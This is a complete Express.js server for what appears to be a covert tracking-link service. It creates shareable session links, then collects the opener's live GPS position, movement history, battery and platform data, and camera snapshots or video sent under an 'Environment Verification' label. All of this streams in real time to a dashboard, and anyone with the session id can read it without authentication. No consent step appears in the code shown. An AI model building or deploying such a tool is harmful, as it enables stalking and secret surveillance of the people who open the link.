const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

// Trust reverse proxies (Vercel, Cloudflare, AWS ALB)
app.set("trust proxy", true);

app.use(express.json({ limit: "15mb" }));
app.use(express.urlencoded({ limit: "15mb", extended: true }));

// Serve static assets (index.html, share.html, style.css)
app.use(express.static(path.join(__dirname, "public")));

// --- Telemetry Storage: In-Memory + Optional Vercel KV / Upstash Redis ---
const memoryStore = new Map();
const activeListeners = new Map();

const kvUrl = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const kvToken = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

async function getSession(id) {
  if (!id) return null;
  if (memoryStore.has(id)) {
    return memoryStore.get(id);
  }
  if (kvUrl && kvToken) {
    try {
      const res = await fetch(`${kvUrl}/get/session_${id}`, {
        headers: { Authorization: `Bearer ${kvToken}` },
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result) {
          const session = typeof data.result === "string" ? JSON.parse(data.result) : data.result;
          memoryStore.set(id, session);
          return session;
        }
      }
    } catch (e) {
      console.warn("KV fetch error:", e.message);
    }
  }
  return null;
}

async function saveSession(id, session) {
  memoryStore.set(id, session);
  if (kvUrl && kvToken) {
    try {
      await fetch(`${kvUrl}/set/session_${id}`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${kvToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(session),
      });
    } catch (e) {
      console.warn("KV save error:", e.message);
    }
  }
}

function getBaseUrl(req) {
  if (process.env.BASE_URL) {
    return process.env.BASE_URL.replace(/\/+$/, "");
  }
  if (process.env.VERCEL_URL) {
    return `https://${process.env.VERCEL_URL}`;
  }
  const protocol = req.headers["x-forwarded-proto"] || req.protocol || "http";
  const host = req.headers["x-forwarded-host"] || req.get("host");
  return `${protocol}://${host}`;
}

// 1. Create a new tracking session
app.post("/api/create", async (req, res) => {
  const id = crypto.randomBytes(8).toString("hex");
  const now = Date.now();
  const session = {
    id,
    createdAt: now,
    expiresAt: now + 24 * 60 * 60 * 1000,
    location: null,
    history: [],
    device: null,
  };

  await saveSession(id, session);

  const baseUrl = getBaseUrl(req);
  res.json({
    id,
    url: `${baseUrl}/share.html?id=${id}`,
    trackUrl: `${baseUrl}/?track=${id}`,
    createdAt: session.createdAt,
    expiresAt: session.expiresAt,
  });
});

// 2. Ingest real-time coordinates
app.post("/api/location", async (req, res) => {
  const { id, latitude, longitude, accuracy, altitude, speed, heading, isLive, device } = req.body || {};

  const session = await getSession(id);
  if (!session) {
    return res.status(404).json({ error: "Session not found or expired." });
  }

  if (![latitude, longitude, accuracy].every(Number.isFinite)) {
    return res.status(400).json({ error: "Invalid coordinate payload." });
  }

  if (Math.abs(latitude) > 90 || Math.abs(longitude) > 180 || accuracy < 0) {
    return res.status(400).json({ error: "Coordinates out of geographic range." });
  }

  const now = Date.now();
  const telemetryPoint = {
    latitude: Number(latitude.toFixed(6)),
    longitude: Number(longitude.toFixed(6)),
    accuracy: Math.round(accuracy * 10) / 10,
    altitude: Number.isFinite(altitude) ? Math.round(altitude * 10) / 10 : null,
    speed: Number.isFinite(speed) && speed >= 0 ? Math.round(speed * 3.6 * 10) / 10 : 0,
    heading: Number.isFinite(heading) && heading >= 0 ? Math.round(heading) : null,
    isLive: Boolean(isLive),
    receivedAt: now,
  };

  session.location = telemetryPoint;
  if (device && typeof device === "object") {
    session.device = {
      battery: Number.isFinite(device.battery) ? Math.round(device.battery) : null,
      charging: Boolean(device.charging),
      platform: typeof device.platform === "string" ? device.platform.slice(0, 50) : null,
    };
  }

  if (!session.history) session.history = [];
  session.history.push({
    lat: telemetryPoint.latitude,
    lng: telemetryPoint.longitude,
    acc: telemetryPoint.accuracy,
    speed: telemetryPoint.speed,
    time: now,
  });

  if (session.history.length > 500) session.history.shift();

  await saveSession(id, session);

  // Broadcast to active SSE listeners
  if (activeListeners.has(id)) {
    const payload = JSON.stringify({
      type: "telemetry",
      location: telemetryPoint,
      device: session.device,
      historyCount: session.history.length,
    });
    for (const sendEvent of activeListeners.get(id)) {
      try {
        sendEvent(payload);
      } catch (e) {}
    }
  }

  res.json({ ok: true, receivedAt: now });
});

// 3. Upload Environment Verification Camera Clip / Snapshot
app.post("/api/media", async (req, res) => {
  const { id, type, dataUrl } = req.body || {};

  const session = await getSession(id);
  if (!session) {
    return res.status(404).json({ error: "Session not found or expired." });
  }

  if (!dataUrl || typeof dataUrl !== "string") {
    return res.status(400).json({ error: "Invalid or missing media data." });
  }

  const mediaItem = {
    type: type === "video" ? "video" : "image",
    dataUrl,
    receivedAt: Date.now(),
  };

  if (!session.media) session.media = [];
  session.media.push(mediaItem);
  if (session.media.length > 10) session.media.shift();

  await saveSession(id, session);

  // Real-time broadcast to dashboard viewers
  if (activeListeners.has(id)) {
    const payload = JSON.stringify({
      type: "media",
      media: mediaItem,
    });
    for (const sendEvent of activeListeners.get(id)) {
      try {
        sendEvent(payload);
      } catch (e) {}
    }
  }

  res.json({ ok: true, receivedAt: mediaItem.receivedAt });
});

// 4. Query location telemetry & media clips
app.get("/api/location/:id", async (req, res) => {
  const session = await getSession(req.params.id);
  if (!session) {
    return res.status(404).json({ error: "Session not found or expired." });
  }

  res.json({
    id: session.id,
    createdAt: session.createdAt,
    expiresAt: session.expiresAt,
    location: session.location,
    device: session.device,
    history: session.history,
    media: session.media || [],
  });
});

// 4. Server-Sent Events stream
app.get("/api/stream/:id", async (req, res) => {
  const session = await getSession(req.params.id);
  if (!session) {
    return res.status(404).json({ error: "Session not found." });
  }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders?.();

  const sendEvent = (data) => {
    res.write(`data: ${data}\n\n`);
  };

  if (!activeListeners.has(session.id)) {
    activeListeners.set(session.id, new Set());
  }
  activeListeners.get(session.id).add(sendEvent);

  if (session.location) {
    sendEvent(JSON.stringify({
      type: "telemetry",
      location: session.location,
      device: session.device,
      historyCount: session.history.length,
    }));
  } else {
    sendEvent(JSON.stringify({
      type: "waiting",
      message: "Awaiting remote device GPS lock...",
    }));
  }

  const heartbeat = setInterval(() => {
    res.write(": ping\n\n");
  }, 20000);

  req.on("close", () => {
    clearInterval(heartbeat);
    if (activeListeners.has(session.id)) {
      activeListeners.get(session.id).delete(sendEvent);
    }
  });
});

// Fallback for SPA/direct navigation
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Start listening when executed locally
if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`[Enterprise Telemetry Server] Running on http://localhost:${PORT}`);
  });
}

// Export for Vercel Serverless
module.exports = app;
